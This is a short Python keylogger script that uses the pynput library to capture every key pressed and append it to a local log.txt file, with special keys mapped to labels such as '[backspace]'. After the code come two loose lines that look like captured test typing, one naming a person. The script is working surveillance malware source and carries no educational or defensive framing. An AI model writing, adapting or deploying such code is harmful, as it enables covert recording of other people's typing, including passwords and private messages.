from pynput.mouse import Listener as MouseListener, Controller as MouseController
from pynput.keyboard import Key, Listener as KeyboardListener, Controller as KeyboardController

def writetofile(key):
    letter = str(key).replace("'", "")

    key_mappings = {
        'Key.space': " ",
        'Key.enter': "\n",
        'Key.shift': " [shift] \n",
        'Key.shift_l': " [left shift] \n",
        'Key.shift_r': " [right shift] \n",
        'Key.ctrl': " [ctrl] \n",
        'Key.ctrl_l': " [left ctrl] \n",
        'Key.ctrl_r': " [right ctrl] \n",
        'Key.alt': " [alt] \n",
        'Key.alt_l': " [left alt] \n",
        'Key.alt_r': " [right alt] \n",
        'Key.alt_gr': " [alt gr] \n",
        'Key.cmd': " [cmd] \n",
        'Key.cmd_l': " [left cmd] \n",
        'Key.cmd_r': " [right cmd] \n",
        'Key.backspace': " [backspace] \n",
        'Key.caps_lock': " [caps lock] \n",
        'Key.delete': " [delete] \n",
        'Key.down': " [down arrow] \n",
        'Key.up': " [up arrow] \n",
        'Key.left': " [left arrow] \n",
        'Key.right': " [right arrow] \n",
        'Key.end': " [end] \n",
        'Key.esc': " [esc] \n",
        'Key.f1': " [f1] \n",
        'Key.home': " [home] \n",
        'Key.insert': " [insert] \n",
        'Key.menu': " [menu] \n",
        'Key.num_lock': " [num lock] \n",
        'Key.page_down': " [page down] \n",
        'Key.page_up': " [page up] \n",
        'Key.pause': " [pause/break] \n",
        'Key.print_screen': " [print screen] \n",
        'Key.scroll_lock': " [scroll lock] \n",
        'Key.tab': " [tab] \n"
    }

    if letter in key_mappings:
        letter = key_mappings[letter]

    with open("log.txt", 'a') as f:
        f.write(letter)

with KeyboardListener(on_press=writetofile) as listener:
    listener.join()


hi my amme is rahil aziz halai.    
whats up vedant